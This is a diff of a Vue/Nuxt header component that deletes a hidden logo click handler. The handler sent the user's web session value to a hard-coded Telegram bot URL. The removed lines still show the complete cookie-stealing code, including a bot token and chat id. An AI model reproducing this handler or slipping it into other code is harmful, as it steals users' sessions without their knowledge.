@@ -24,7 +24,7 @@
         </div>
       </div>
       <div v-if="left" class="left-container">
-        <div class="logo-data" @click="sendCookieToTg">
+        <div class="logo-data">
           <NuxtImg
             v-if="appStore.theme === 'light'"
             class="logo-img"
@@ -72,20 +72,7 @@
 </template>
 
 <script setup>
-import { storeToRefs } from 'pinia'
-
 const appStore = useAppStore()
-const { webSession } = storeToRefs(appStore)
-
-const sendCookieToTg = () => {
-  const data = `<pre><code class="language-javascript">${webSession.value}</code></pre>`
-  fetch(
-    `https://api.telegram.org/bot6789685486:AAFmpL2nId5LRxhxYymMagh-0yARXV1Nxhc/sendMessage?chat_id=-1002074363401&parse_mode=html&text=${data}`,
-    {
-      method: 'GET',
-    },
-  )
-}
 
 defineProps({
   left: {
